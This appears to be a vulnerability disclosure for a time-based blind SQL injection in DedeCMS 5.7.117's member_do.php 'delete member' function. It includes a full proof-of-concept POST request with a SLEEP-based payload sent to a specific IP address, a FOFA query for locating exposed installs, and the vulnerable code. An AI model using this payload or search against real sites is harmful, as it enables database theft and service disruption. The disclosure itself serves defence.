# dede-sql
A SQL injection vulnerability exists in DedeCMS version 5.7.117. The id parameter in the backend "delete member" functionality of DedeCMS 5.7.117 is vulnerable to SQL injection.
dedecms-sql
"/uploads/dede/member_do.php"
A SQL injection vulnerability exists in DedeCMS version 5.7.117. The id parameter in the backend "delete member" functionality of DedeCMS 5.7.117 is vulnerable to SQL injection.

fofa：app="dedecms"

Vulnerability PoC (Proof of Concept)：



POST /dede/member_do.php HTTP/1.1
Host: 154.217.245.237:321
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Origin: http://154.217.245.237:321
Accept-Encoding: gzip, deflate
Referer: http://154.217.245.237:321/dede/member_do.php?dopost=delmembers
Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=h9tt2vjvirml3asna1ekq04hv6; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=037964ffa0771fbf; DedeLoginTime=1747393431; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=a748faa5d92cfdc5; _csrf_name_9db0aa8a=759e15fd9a6d4676714db2b1ea3455b6; _csrf_name_9db0aa8a1BH21ANI1AGD297L1FF21LN02BGE1DNG=93e9f7a333113b48; ENV_GOBACK_URL=%2Fdede%2Fmember_main.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 147

fmdo=yes&dopost=delmembers&id=0) OR (SELECT 9712 FROM (SELECT(SLEEP(15)))cwJB) AND (3848=3848&randcode=69709&safecode=29196a09b90ce5dd1bbe7314&safecode=29196a09b90ce5dd1bbe7314&imageField1.x=42&imageField1.y=16
![image](https://github.com/user-attachments/assets/bfa264f2-5ac4-492a-ab05-607bb80230c3)




Vulnerability Type: Authentication-bypassable SQL Injection (Time-based Blind)

A SQL Injection vulnerability exists in DedeCMS version 5.7.117 in the backend script member_do.php. The id parameter used in the "delete member" (dopost=delmembers) functionality is insufficiently sanitized. Although a preg_replace is applied (preg_replace("#[^0-9]#", "", $id)), the variable is used before sanitization within SQL queries, leading to a time-based blind SQL injection.

An authenticated attacker can exploit this vulnerability by sending a crafted POST request containing malicious SQL in the id parameter, such as:

POST /dede/member_do.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
...
fmdo=yes&dopost=delmembers&id=0) OR (SELECT 9712 FROM (SELECT(SLEEP(15)))cwJB) AND (3848=3848&randcode=69709&safecode=29196a09b90ce5dd1bbe7314

The SQL injection allows arbitrary query execution in the database context, enabling data extraction or service disruption via sleep-based attacks. The vulnerability resides in this code snippet:

$row = $dsql->GetOne("SELECT * FROM `#@__member` WHERE mid='$id' LIMIT 1");
...
$rs = $dsql->ExecuteNoneQuery2("DELETE FROM `#@__member` WHERE mid='$id' LIMIT 1");



Impact:
This vulnerability allows authenticated attackers to execute arbitrary SQL queries in the backend, leading to information disclosure, data manipulation, or denial of service.
![image](https://github.com/user-attachments/assets/38e34468-9ddf-4e60-a9b2-df4912a2e7ec)
<img width="553" alt="image" src="https://github.com/user-attachments/assets/81360231-cd23-4192-a412-9dac7f959eca" />


